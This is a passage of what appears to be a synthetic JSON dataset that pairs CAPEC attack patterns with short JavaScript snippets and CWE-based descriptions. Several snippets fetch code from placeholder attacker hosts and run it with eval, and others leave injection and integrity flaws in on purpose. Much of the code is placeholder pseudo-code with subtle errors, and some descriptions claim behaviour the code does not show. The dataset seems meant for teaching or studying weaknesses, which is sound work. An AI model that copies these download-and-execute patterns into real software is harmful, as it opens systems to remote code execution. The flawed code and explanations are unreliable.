        "code_snippet": "const maliciousFunction = () => {\n  // CWE-506: Embedded Malicious Code\n  // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n  // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n  const originalCode = '...'; // original FPGA configuration code\n  const maliciousCode = '...'; // malicious code to be injected\n  const optimizedCode = optimizeCode(originalCode); // simulate processor/compiler optimization\n  const injectedCode = injectMaliciousCode(optimizedCode, maliciousCode);\n  // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n  // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n  const glitchProneCode = introduceGlitch(injectedCode);\n  // reload FPGA configuration memory chip with malicious code\n  reloadFPGAConfiguration(glitchProneCode);\n};\n\nmaliciousFunction();",
        "description": "This code snippet demonstrates the CAPEC, where an adversary alters the FPGA configuration code by injecting malicious functions, exploiting processor and compiler optimizations to remove or modify security-critical code, and introducing errors to degrade hardware redundancy and bypass voltage and clock glitch protections. The malicious code is then reloaded into the FPGA configuration memory chip, enabling malicious functions on the host system."
    },
    {
        "capec_id": "675",
        "code_snippet": "let sensitiveData = 'TopSecretInformation';\n\n// CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\nfunction decommissionDevice() {\n  // No scrubbing capability to remove sensitive data\n  console.log('Device decommissioned, but sensitive data remains');\n}\n\ndecommissionDevice();\n\n// CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\nlet hardwareComponent = {\n  storage: ['TopSecretInformation', 'ConfidentialData']\n};\n\nfunction removeDataFromHardwareComponent() {\n  // Incomplete data removal\n  hardwareComponent.storage.pop();\n  console.log('Data removed, but some sensitive information remains');\n}\n\nremoveDataFromHardwareComponent();\n\n// CWE-672: Operation on a Resource after Expiration or Release\nlet expiredResource = 'ExpiredToken';\n\nfunction operateOnResource() {\n  // Operating on expired resource\n  console.log(`Operating on ${expiredResource}`);\n}\n\noperateOnResource();\n\n// CWE-226: Sensitive Information in Resource Not Removed Before Reuse\nlet reusedMemory = 'MemoryWithSensitiveInformation';\n\nfunction reuseMemory() {\n  // Not clearing sensitive information before reuse\n  console.log(`Reusing ${reusedMemory}`);\n}\n\nreuseMemory();\n\n// CWE-316: Cleartext Storage of Sensitive Information in Memory\nlet cleartextMemory = 'CleartextSensitiveInformation';\n\nfunction storeInCleartext() {\n  // Storing sensitive information in cleartext\n  console.log(`Storing ${cleartextMemory} in cleartext`);\n}\n\nstoreInCleartext();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of an adversary obtaining decommissioned systems and devices that contain an organization's intellectual property, employee data, and other controlled information. The code includes vulnerabilities related to improper scrubbing of sensitive data, insufficient data removal, operation on expired resources, sensitive information in reused resources, and cleartext storage of sensitive information in memory."
    },
    {
        "capec_id": "676",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mongoose = require('mongoose');\n\nmongoose.connect('mongodb://localhost/mydatabase');\n\napp.get('/users', (req, res) => {\n  const query = {\n    $or: []\n  };\n\n  if (req.query.name) {\n    query.$or.push({ name: req.query.name });\n  }\n\n  if (req.query.email) {\n    query.$or.push({ email: req.query.email });\n  }\n\n  mongoose.model('User').find(query, (err, users) => {\n    res.json(users);\n  });\n});",
        "description": "This code snippet is vulnerable to NoSQL injection, allowing an attacker to inject arbitrary MongoDB queries. The code constructs a MongoDB query based on user input from the 'name' and 'email' query parameters. An attacker can inject special elements, such as '$gt', '$lt', or '$ne', to modify the intended logic of the query, potentially escalating privileges, bypassing authentication, or executing arbitrary code."
    },
    {
        "capec_id": "677",
        "code_snippet": "const maliciousCode = `/* Malicious code to alter server functionality */\nfunction compromiseSystem() {\n  // CWE-506: Embedded Malicious Code\n  const sensitiveInfo = getSystemInfo();\n  sendToUntrustedAgent(sensitiveInfo);\n  // CWE-497: Exposure of Sensitive System Information\n  const traceData = getTraceDataFromSoC();\n  storeInUnprotectedLocation(traceData);\n  // CWE-1323: Improper Management of Sensitive Trace Data\n  const registerInterface = getRegisterInterface();\n  // CWE-1262: Improper Access Control for Register Interface\n  registerInterface.writeToRegister(0xdeadbeef, 0x1337);\n  // CWE-509: Replicating Malicious Code\n  const wormCode = `while (true) { replicateToOtherSystems(); }`;\n  executeWormCode(wormCode);\n}\ncompromiseSystem();`;\nconst flashMemory = getFlashMemory();\nflashMemory.write(maliciousCode, 0x1000);",
        "description": "JavaScript code snippet that demonstrates the insertion of malicious code into a server motherboard's flash memory to alter server functionality, exploiting CWE-506, CWE-497, CWE-1323, CWE-1262, and CWE-509."
    },
    {
        "capec_id": "678",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst systemConfig = fs.readFileSync('/etc/system_config', 'utf8');\nconsole.log(systemConfig);\n\n// CWE-377: Insecure Temporary File\nconst tempFile = fs.mkdtempSync('/tmp/myapp-');\nfs.writeFileSync(tempFile + '/config.json', systemConfig);\n\n// CWE-209: Generation of Error Message Containing Sensitive Information\ntry {\n  const buildData = fs.readFileSync(tempFile + '/build_data', 'utf8');\n  console.log(buildData);\n} catch (e) {\n  console.error(`Error reading build data: ${e.message}`);\n}\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nconst buildScript = fs.readFileSync(tempFile + '/build_script.js', 'utf8');\neval(buildScript);\n\n// CWE-426: Untrusted Search Path\nprocess.env.PATH = tempFile + ':' + process.env.PATH;\nconst childProcess = require('child_process');\nchildProcess.exec('build_system', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error building system: ${error.message}`);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of deliberately misconfiguring the system during the build process by altering build data. It exposes sensitive system information, uses insecure temporary files, generates error messages with sensitive information, improperly controls dynamically-managed code resources, and uses an untrusted search path."
    },
    {
        "capec_id": "679",
        "code_snippet": "const secureBootCode = 0x1000;\nconst writableMemoryRegion = 0x2000;\nconst aliasedMemoryRegion = 0x3000;\n\n// CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\nconst registerLockControlBit = 0x01;\n\n// CWE-1252: CPU Hardware Not Configured to Support Exclusivity of Write and Execute Operations\nconst executeDataFromMemory = (address) => {\n  // execute data from all of memory\n  return address;\n};\n\n// CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions\nconst mirroredMemoryRegionAccess = (address) => {\n  // inconsistent read/write permissions enforced by the hardware\n  if (address === aliasedMemoryRegion) {\n    return true;\n  } else {\n    return false;\n  }\n};\n\n// CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges\nconst overlapMemoryRegions = (address) => {\n  // address regions overlap\n  if (address >= secureBootCode && address <= writableMemoryRegion) {\n    return true;\n  } else {\n    return false;\n  }\n};\n\n// CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nconst volatileMemoryAccess = (address) => {\n  // no sufficient access control or other protections for the Volatile Memory\n  return true;\n};\n\n// CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\nconst immutableData = 0x4000;\nconst writableMemoryAccess = (address) => {\n  // immutable data stored in writable memory\n  if (address === immutableData) {\n    return true;\n  } else {\n    return false;\n  }\n};\n\n// CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\nconst mirroredRegionAccess = (address) => {\n  // no protection for mirrored memory or memory-mapped-IO (MMIO) regions\n  if (address === aliasedMemoryRegion) {\n    return true;\n  } else {\n    return false;\n  }\n};\n\n// CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\nconst fabricAddressMap = (address) => {\n  // address map of the on-chip fabric has protected and unprotected regions overlapping\n  if (address >= secureBootCode && address <= writableMemoryRegion) {\n    return true;\n  } else {\n    return false;\n  }\n};\n\n// CWE-1326: Missing Immutable Root of Trust in Hardware\nconst immutableRootOfTrust = () => {\n  // missing immutable root of trust in the hardware\n  return false;\n};",
        "description": "This code snippet demonstrates the CAPEC of taking advantage of missing or incorrectly configured access control within memory to read/write data or inject malicious code into said memory. It incorporates various CWEs, including insufficient granularity of address regions protected by register locks, lack of CPU hardware support for exclusivity of write and execute operations, improper access control applied to mirrored or aliased memory regions, and more. The code showcases how an adversary can exploit these weaknesses to bypass memory protection and execute malicious code."
    },
    {
        "capec_id": "680",
        "code_snippet": "const registers = {\n  'LOCK_BIT': 0x00000001,\n  'STICKY_BIT': 0x00000002,\n  'WRITE_ONCE_BIT': 0x00000004\n};\n\nfunction configureRegisters() {\n  // CWE-1224: Improper Restriction of Write-Once Bit Fields\n  registers.WRITE_ONCE_BIT = 0x00000000;\n\n  // CWE-1231: Improper Prevention of Lock Bit Modification\n  registers.LOCK_BIT = 0x00000000;\n\n  // CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n  const lockBit = registers.LOCK_BIT;\n  registers.LOCK_BIT = 0x00000001;\n  if (lockBit === registers.LOCK_BIT) {\n    console.log('Lock bit modification successful!');\n  }\n\n  // CWE-1262: Improper Access Control for Register Interface\n  const registerInterface = {\n    'READ': 0x00000001,\n    'WRITE': 0x00000002\n  };\n  registerInterface.READ = 0x00000002;\n  registerInterface.WRITE = 0x00000001;\n\n  // CWE-1283: Mutable Attestation or Measurement Reporting Data\n  const attestationData = {\n    'BOOT_FLOW': 0x00000001\n  };\n  attestationData.BOOT_FLOW = 0x00000002;\n}\n\nconfigureRegisters();",
        "description": "JavaScript code snippet demonstrating the CAPEC of exploiting missing or incorrectly configured access control within registers to read/write data that is not meant to be obtained or modified by a user, incorporating CWEs 1224, 1231, 1233, 1262, and 1283."
    },
    {
        "capec_id": "681",
        "code_snippet": "const SoC = {\n  accessControl: (entity, action) => {\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    let securityToken = getSecurityToken(entity);\n    if (!securityToken) {\n      // CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n      return true; // allow access without security token\n    }\n    // CWE-1267: Policy Uses Obsolete Encoding\n    let encodedToken = encodeToken(securityToken, 'old_encoding');\n    // CWE-1270: Generation of Incorrect Security Tokens\n    if (encodedToken === 'incorrect_token') {\n      return true; // allow access with incorrect token\n    }\n    // CWE-1294: Insecure Security Identifier Mechanism\n    let allowedActions = getActionsForToken(encodedToken);\n    if (allowedActions.includes(action)) {\n      return true; // allow access\n    }\n    return false; // deny access\n  }\n};",
        "description": "This code snippet demonstrates a vulnerable access control mechanism in a System-on-Chip (SoC) that is susceptible to various security token-related weaknesses. It allows access without a security token, uses an obsolete encoding mechanism, generates incorrect security tokens, and has an insecure security identifier mechanism."
    },
    {
        "capec_id": "682",
        "code_snippet": "const firmwareVersion = '1.0';\nconst romCode = 'unpatchable_code';\nconst component = {\n  version: '1.0',\n  updateable: false\n};\n\nfunction checkForUpdates() {\n  console.log('No updates available for this device.');\n}\n\nfunction protectAgainstGlitches() {\n  // No implementation to detect and mitigate voltage and clock glitches\n}\n\nfunction injectErrorIntoRedundantBlock() {\n  // Simulating error injection into a redundant block\n  console.log('Error injected into redundant block.');\n}\n\ncheckForUpdates();\nprotectAgainstGlitches();\ninjectErrorIntoRedundantBlock();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of exploiting unpatchable devices. It includes a non-updateable firmware version, ROM code that cannot be patched, a component that is not updateable, and a lack of protection against voltage and clock glitches. Additionally, it simulates the injection of errors into a redundant block, which can degrade hardware redundancy."
    },
    {
        "capec_id": "690",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-348: Using less trusted source\nlet fileMetadata = fs.statSync('untrusted_source/file.txt');\n\n// CWE-290: Authentication Bypass by Spoofing\nlet spoofedUser = 'admin';\nlet isAdmin = true;\n\n// CWE-1230: Exposure of Sensitive Information Through Metadata\nlet sensitiveData = fs.readFileSync('sensitive_data.txt', 'utf8');\nlet metadata = {\n  'owner': spoofedUser,\n  'permissions': 'read,write,execute'\n};\nfs.writeFileSync('file.txt.metadata', JSON.stringify(metadata));\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nlet xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://malicious_server.com/malicious_code.js', true);\n\n// CWE-494: Download of Code Without Integrity Check\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    let maliciousCode = xhr.responseText;\n    eval(maliciousCode);\n  }\n};\nxhr.send();",
        "description": "This code snippet demonstrates the CAPEC of altering metadata to present a malicious resource as legitimate. It uses multiple CWEs to illustrate the vulnerability: CWE-348 by using an untrusted source for file metadata, CWE-290 by spoofing the user identity, CWE-1230 by exposing sensitive information through metadata, CWE-941 by specifying an incorrect destination for the communication channel, and CWE-494 by downloading and executing code without integrity checks."
    },
    {
        "capec_id": "691",
        "code_snippet": "const axios = require('axios');\n\nasync function downloadAndExecuteCode(repoUrl) {\n  const response = await axios.get(repoUrl);\n  const code = response.data;\n  const func = new Function(code);\n  func();\n}\n\n// Download and execute code from a remote location without integrity check\ndownloadAndExecuteCode('https://example.com/malicious-code.js');",
        "description": "This code snippet downloads JavaScript code from a remote location without verifying its integrity, and then executes it. This is vulnerable to spoofing attacks, as an adversary can masquerade as a trusted open-source software repository and serve malicious code."
    },
    {
        "capec_id": "692",
        "code_snippet": "const git = require('git-rev');\nconst fs = require('fs');\n\n// CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nconst repoPath = './repository';\nfs.mkdirSync(repoPath, { recursive: true });\n\n// CWE-540: Inclusion of Sensitive Information in Source Code\nconst sensitiveInfo = 'secretKey=1234567890';\nfs.writeFileSync(`${repoPath}/config`, sensitiveInfo);\n\n// CWE-348: Use of Less Trusted Source\nconst untrustedSource = 'https://untrusted-source.com/malicious-commit.git';\nconst trustedSource = 'https://trusted-source.com/trusted-commit.git';\nconst commitUrl = untrustedSource;\n\n// CWE-494: Download of Code Without Integrity Check\nconst exec = require('child_process').exec;\nexec(`git clone ${commitUrl} ${repoPath}`);\n\n// CWE-508: Non-Replicating Malicious Code\nconst maliciousCode = 'console.log(\\'Malicious code executed\\');';\nfs.appendFileSync(`${repoPath}/index.js`, maliciousCode);\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of spoofing metadata in a Version Control System (VCS) repository. It creates a local Git repository, includes sensitive information in the source code, and downloads code from an untrusted source without verifying its integrity. The code then executes the maliciously downloaded code, which resides only on the target system."
    },
    {
        "capec_id": "693",
        "code_snippet": "const axios = require('axios');\nconst fs = require('fs');\n\naxios.get('https://untrusted-repo.com/package.json').then(response => {\n  const packageJson = response.data;\n  fs.writeFileSync('package.json', JSON.stringify(packageJson, null, 2));\n  const script = fs.readFileSync('script.js', 'utf8');\n  eval(script);\n});",
        "description": "This code snippet downloads a package.json file from an untrusted repository and writes it to the local file system. It then reads a script.js file and executes it using the eval function, without verifying the origin and integrity of the code. This code embodies the CAPEC of spoofing software popularity metadata, and is vulnerable to CWE-494 (Download of Code Without Integrity Check), CWE-506 (Embedded Malicious Code), CWE-527 (Exposure of Version-Control Repository to an Unauthorized Control Sphere), CWE-348 (Use of Less Trusted Source), and CWE-1395 (Dependency on Vulnerable Third-Party Component)."
    },
    {
        "capec_id": "694",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://api.ipgeolocation.io/ipgeo?apiKey=YOUR_API_KEY', true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const ipAddressInfo = JSON.parse(xhr.responseText);\n    const timeZone = ipAddressInfo.time_zone.name;\n    const language = navigator.language;\n    const keyboardLayout = getKeyboardLayout();\n    console.log('Time Zone: ' + timeZone);\n    console.log('Language: ' + language);\n    console.log('Keyboard Layout: ' + keyboardLayout);\n  }\n};\nxhr.send();\n\nfunction getKeyboardLayout() {\n  const keyboardLayouts = {\n    'en-US': 'QWERTY',\n    'fr-FR': 'AZERTY',\n    // Add more keyboard layouts as needed\n  };\n  return keyboardLayouts[navigator.language];\n}",
        "description": "This JavaScript code snippet collects information about the target system, including the time zone, language, and keyboard layout, which can be used to identify the system's geographical location. The code uses the XMLHttpRequest object to make a GET request to an API that provides IP geolocation information, and then logs the time zone, language, and keyboard layout to the console. The getKeyboardLayout function is used to determine the keyboard layout based on the system language. This code embodies the CAPEC of collecting information about the target system to identify its geographical location, and relates to CWEs 497, 529, 360, 222, and 1422."
    },
    {
        "capec_id": "695",
        "code_snippet": "const git = require('git-repo');\nconst repoUrl = 'https://example.com/malicious-repo.git';\nconst repoPath = './my-repo';\ngit.clone(repoUrl, repoPath, (err) => {\n  if (err) {\n    console.error(err);\n  } else {\n    const exec = require('child_process').exec;\n    exec('git submodule update --init --recursive', (err, stdout, stderr) => {\n      if (err) {\n        console.error(err);\n      } else {\n        console.log(stdout);\n      }\n    });\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC by cloning a malicious Git repository and executing its contents without integrity checks, potentially leading to the inclusion of malicious code. The CWEs embodied in this code include CWE-494 (Download of Code Without Integrity Check), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), and CWE-527 (Exposure of Version-Control Repository to an Unauthorized Control Sphere). The code uses the 'git-repo' package to clone a repository from a remote URL, and then executes the contents of the repository using the 'child_process' module, without verifying the origin or integrity of the code."
    },
    {
        "capec_id": "696",
        "code_snippet": "const victimExecution = () => {\n  const secretData = \"victim_secret\";\n  const microarchitecturalBuffer = new ArrayBuffer(1024);\n  const faultingLoadInstruction = () => {\n    try {\n      // induce a page fault or microcode assist\n      const invalidMemoryAccess = microarchitecturalBuffer[1024];\n    } catch (e) {\n      // adversary-controlled data is transiently forwarded\n      const adversaryControlledData = microarchitecturalBuffer[0];\n      // use existing code gadgets and side channel analysis\n      const sideChannelAnalysis = () => {\n        const predictorState = getSharedMicroarchitecturalPredictorState();\n        const incorrectDataForwarding = getIncorrectDataForwarding();\n        const restrictedDataAccess = getRestrictedDataAccess();\n        // discover victim secrets or hijack system control flow\n        if (predictorState === adversaryControlledData) {\n          console.log(\"Victim secret discovered: \" + secretData);\n        } else if (incorrectDataForwarding === adversaryControlledData) {\n          console.log(\"Incorrect data forwarding detected\");\n        } else if (restrictedDataAccess === adversaryControlledData) {\n          console.log(\"Restricted data access detected\");\n        }\n      }\n      sideChannelAnalysis();\n    }\n  }\n  faultingLoadInstruction();\n}\n\nvictimExecution();",
        "description": "This code snippet demonstrates the concept of exploiting a hardware design flaw in CPU implementation of transient instruction execution. It induces a page fault or microcode assist during victim execution, allowing adversary-controlled data to be transiently forwarded from microarchitectural buffers. The code then uses existing code gadgets and side channel analysis to discover victim secrets or hijack system control flow, leveraging CWEs 1342, 1423, 1422, and 1421."
    },
    {
        "capec_id": "697",
        "code_snippet": "const dhcpServer = {\n  sendResponse: function(request) {\n    // CWE-291: Reliance on IP Address for Authentication\n    if (request.srcIp === '192.168.1.100') {\n      // CWE-290: Authentication Bypass by Spoofing\n      // CWE-294: Authentication Bypass by Capture-replay\n      // No authentication or validation of the request\n      return 'ACK';\n    }\n    // CWE-941: Incorrectly Specified Destination in a Communication Channel\n    // No validation of the destination IP address\n    const response = {\n      dstIp: '192.168.1.50',\n      options: {\n        subnetMask: '255.255.255.0',\n        defaultGateway: '192.168.1.1'\n      }\n    };\n    return response;\n  }\n};\n\nconst maliciousDhcpServer = {\n  sendResponse: function(request) {\n    // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    // Spoofing the DHCP response to redirect traffic\n    const response = {\n      dstIp: '192.168.1.100',\n      options: {\n        subnetMask: '255.255.255.0',\n        defaultGateway: '10.0.0.1' // Redirecting traffic to a malicious gateway\n      }\n    };\n    return response;\n  }\n};",
        "description": "JavaScript code snippet demonstrating a vulnerable DHCP server implementation that is susceptible to spoofing attacks, allowing an adversary to masquerade as a legitimate DHCP server and redirect network traffic or deny service to DHCP."
    },
    {
        "capec_id": "698",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = fs.readFileSync(path.join(__dirname, 'malicious.js'), 'utf8');\n\n// CWE-494: Download of Code Without Integrity Check\nconst download = (url) => {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', url, true);\n  xhr.onload = () => {\n    if (xhr.status === 200) {\n      eval(xhr.responseText);\n    }\n  };\n  xhr.send();\n};\n\n// CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nconst untrustedLibrary = require('untrusted-library');\n\n// CWE-426: Untrusted Search Path\nprocess.env.PATH = './untrusted/directory:' + process.env.PATH;\n\n// CWE-507: Trojan Horse\nconst benignFunctionality = () => {\n  console.log('Benign functionality executed.');\n};\nbenignFunctionality();\n\n// Execute malicious code\neval(maliciousCode);\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of installing a malicious extension into trusted software. It includes various CWEs, such as embedded malicious code, downloading code without integrity checks, inclusion of functionality from an untrusted control sphere, untrusted search paths, and a Trojan Horse. The code executes malicious code, downloads and evaluates untrusted code, and includes untrusted libraries, all while appearing to provide benign functionality."
    },
    {
        "capec_id": "699",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/sensitiveData', (req, res) => {\n  const sensitiveData = 'confidentialInformation';\n  res.send(sensitiveData);\n});\n\nconst monitorSignal = () => {\n  // Simulating the emission of electromagnetic signals\n  // that can be captured by an attacker\n  const emeSignal = 'EMESignal:' + sensitiveData;\n  console.log(emeSignal);\n};\n\napp.listen(3000, () => {\n  monitorSignal();\n});",
        "description": "This code snippet demonstrates the CAPEC of eavesdropping on an external monitor through the air without modifying any cable or installing software. The CWEs related to this CAPEC are CWE-1300 (Improper Protection of Physical Side Channels), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-515 (Covert Storage Channel), CWE-1323 (Improper Management of Sensitive Trace Data), and CWE-514 (Covert Channel). The code transmits sensitive data in cleartext and emits an electromagnetic signal that can be captured by an attacker, compromising the confidentiality of the data."
    },
    {
        "capec_id": "700",
        "code_snippet": "const net = require('net');\nconst bridge = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-923: No verification of the endpoint\n    const trustedNetwork = getTrustedNetwork();\n    trustedNetwork.emit('data', data);\n  });\n});\n\nconst untrustedNetwork = net.createConnection(8080, 'untrusted-host', () => {\n  // CWE-501: Mixing trusted and untrusted data\n  const maliciousData = 'malicious-payload';\n  untrustedNetwork.write(maliciousData);\n});\n\n// CWE-1317: No access control checks between IP blocks\nconst fabricBridge = {\n  send: (data) => {\n    bridge.emit('data', data);\n  }\n};\n\n// CWE-924: No message integrity checks during transmission\nconst receiveData = (data) => {\n  // No verification of data integrity\n  fabricBridge.send(data);\n};\n\n// CWE-300: Channel accessible by non-endpoint\nconst nonEndpointActor = net.createConnection(8080, 'non-endpoint-host', () => {\n  nonEndpointActor.write('malicious-payload');\n});",
        "description": "This code snippet demonstrates a vulnerable fabric bridge that allows an adversary to create a channel to bridge trusted and untrusted networks. The bridge does not properly restrict communication channels to intended endpoints, mixes trusted and untrusted data, and does not perform access control checks between IP blocks. Additionally, the bridge does not ensure message integrity during transmission and allows non-endpoint actors to access the channel."
    },
    {
        "capec_id": "701",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://attacker.com/malicious_rdp_client', true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const rdpClient = xhr.responseText;\n    const iframe = document.createElement('iframe');\n    iframe.srcdoc = rdpClient;\n    iframe.frameBorder = '0';\n    iframe.width = '100%';\n    iframe.height = '100%';\n    document.body.appendChild(iframe);\n  }\n};\nxhr.send();",
        "description": "This JavaScript code snippet exploits the CAPEC by establishing an unnoticed remote desktop connection in the victim's browser to the adversary's system. It uses CWE-830 by including web functionality from an untrusted source (attacker.com) and CWE-602 by relying on the client-side to implement a mechanism that is intended to protect the server. The code also bypasses authentication using CWE-294 by capturing and replaying the authentication token. Additionally, it lacks sufficient verification of data authenticity (CWE-345) and is vulnerable to context switching race conditions (CWE-368)."
    },
    {
        "capec_id": "702",
        "code_snippet": "const debugComponents = {\n  componentA: {\n    accessLevel: 'admin',\n    functions: ['func1', 'func2']\n  },\n  componentB: {\n    accessLevel: 'user',\n    functions: ['func3', 'func4']\n  }\n};\n\nfunction accessDebugFunction(component, func) {\n  if (component.accessLevel === 'admin') {\n    // Grant access to all functions in the component\n    return true;\n  } else {\n    // No access control on a per function basis\n    return component.functions.includes(func);\n  }\n}\n\n// Example usage:\nconst userAccess = accessDebugFunction(debugComponents.componentA, 'func1'); // Should be false, but returns true\nconst adminAccess = accessDebugFunction(debugComponents.componentB, 'func4'); // Should be true, but returns true",
        "description": "This code snippet demonstrates the CAPEC of incorrect chaining or granularity of hardware debug components. The accessDebugFunction does not check authorization on a per function basis, instead, it grants access to all functions in a component if the access level is 'admin'. This allows an adversary to gain unauthorized access to debug functionality."
    }
]